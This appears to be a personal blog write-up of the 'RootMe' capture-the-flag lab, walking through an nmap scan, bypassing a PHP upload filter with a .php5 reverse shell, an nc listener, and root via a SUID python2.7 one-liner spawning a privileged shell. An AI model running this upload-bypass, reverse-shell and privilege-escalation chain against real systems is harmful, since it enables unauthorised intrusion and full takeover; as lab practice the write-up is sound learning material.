---
created: 2026-03-22
tags:
  - note
  - journal
  - cyberStuff
title: RootMe
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-03-24T13:03:17.050Z
---
### Reconnaissance

just run

```
sudo nmap $IP -sCV -p-
```

it will give you all the answers needed

### Getting a Shell

this is where it became interesting, in the last step we get a secret folder called `panel` where we can upload different files, cool, we know that this is how we gonna get a reverse shell.

But when i try to when i try to upload a .php reverse shell an error message is triggered saying that php is not allowed , so we gonna have to bypass this file filter somehow\
![647](/images/blog-ul-meu/static/Pasted%20image%2020260322085809.png)\
researching about ways to bypass this i found out about polyglot files, that are basically files that can be executed in multiple file formats , like a png that is also a pdf . So with that in mind we can create a png that is also a php file .\
important to mention that u can bypass this also somehow by intercepting the request using burpsuite , then changing the file format , but i will not go into that

i used this video as a guide :https://www.youtube.com/watch?v=uGk5\_yDbSeQ

yep so , after some time of trying i didn't get to make a polyglot file work on the server as indented, so let's try another approach

apprently if we a php file php5 it also works so let's do that :

first run this ( if you are on kali , else search for a php reverse shell online):

```
cp /usr/share/webshells/php/php-reverse-shell.php .
mv webSheell webSheell.php5 
```

then modify in the file the ip and port and open a listener with the ones you have

start a listener with

```
rlwrap nc -lnvp <YOUR_PORT>

```

upload the file in the form and access it at /uploads\
and like that we get a shell

![](/images/blog-ul-meu/static/Pasted%20image%2020260322104610.png)

### Priv esc

lets enumerate some SUID with

```
find / -perm -u=s -type f 2>/dev/null
```

and we get a SUID on /usr/bin/python2.7\
cool now we just have to search a suid on gtfo bin\
![](/images/blog-ul-meu/static/Pasted%20image%2020260322104804.png)\
and we got this one , just run this one and we are root

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

i will elt u find the paths of the flags bye bye
